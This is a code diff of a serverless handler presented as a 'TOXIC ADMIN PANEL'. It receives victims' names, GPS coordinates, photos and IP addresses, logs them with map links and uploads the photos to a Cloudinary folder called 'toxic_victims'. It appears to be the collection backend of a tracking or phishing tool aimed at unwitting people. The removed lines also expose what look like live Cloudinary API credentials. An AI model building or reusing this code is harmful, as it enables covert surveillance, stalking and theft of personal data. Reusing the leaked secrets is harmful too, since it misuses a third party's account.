@@ -1,11 +1,3 @@
-const cloudinary = require('cloudinary').v2;
-
-cloudinary.config({
-  cloud_name: 'h5lhwizs',
-  api_key: '218264176839572',
-  api_secret: 'HQeioALSxZP0xNVqmx7v_tPqODs'
-});
-
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     const data = req.body;
@@ -13,15 +5,24 @@ export default async function handler(req, res) {
 
     if (data.photo) {
       try {
-        const upload = await cloudinary.uploader.upload(data.photo, {
-          folder: 'toxic_victims',
-          public_id: `victim_${Date.now()}`
+        const form = new FormData();
+        form.append('file', data.photo);
+        form.append('upload_preset', 'toxic_uploads');
+        form.append('folder', 'toxic_victims');   // Folder set
+
+        const uploadRes = await fetch('https://api.cloudinary.com/v1_1/h5lhwizs/image/upload', {
+          method: 'POST',
+          body: form
         });
-        photoUrl = upload.secure_url;
-      } catch(e) { console.error(e); }
+
+        const uploadData = await uploadRes.json();
+        photoUrl = uploadData.secure_url || 'Upload failed';
+      } catch(e) {
+        console.error("Cloudinary error:", e);
+      }
     }
 
-    const logEntry = `\n=== ${new Date().toISOString()} ===\nName: ${data.name}\nLat: ${data.lat} Lon: ${data.lon}\nMap: https://www.google.com/maps?q=${data.lat},${data.lon}\nPhoto: ${photoUrl}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\n\n`;
+    const logEntry = `\n=== ${new Date().toISOString()} ===\nName: ${data.name || 'Unknown'}\nLat: ${data.lat}\nLon: ${data.lon}\nMap: https://www.google.com/maps?q=${data.lat},${data.lon}\nPhoto: ${photoUrl}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\n\n`;
 
     console.log(logEntry);
 
@@ -29,12 +30,12 @@ export default async function handler(req, res) {
   } else {
     res.send(`
       <html><head><title>TOXIC DASHBOARD</title>
-      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;} a{color:#0ff;}</style>
+      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>
       </head><body>
         <h1>🔥 TOXIC ADMIN PANEL - @Toxicadminn</h1>
-        <p><strong>Live Logs → Vercel Dashboard > Functions > log</strong></p>
-        <p>Photos Cloudinary pe save ho rahi hain (permanent links).</p>
+        <p>Check Vercel Function Logs for all details.</p>
+        <p>Photos Cloudinary 'toxic_victims' folder mein hain.</p>
       </body></html>
     `);
   }
-}
+             }
